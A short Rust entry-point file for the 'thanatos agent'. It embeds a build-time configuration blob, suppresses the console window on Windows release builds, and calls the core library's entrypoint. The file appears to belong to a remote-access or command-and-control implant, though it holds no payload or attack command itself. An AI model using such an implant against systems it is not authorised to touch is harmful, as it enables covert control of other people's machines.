//! Binary executable version of the thanatos agent. Wrapper for loading the main thanatos agent

#![cfg_attr(
    all(not(debug_assertions), target_os = "windows"),
    windows_subsystem = "windows"
)]

const CONFIG_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/config.bin"));

fn main() {
    thanatos_core::entrypoint(CONFIG_BYTES);
}
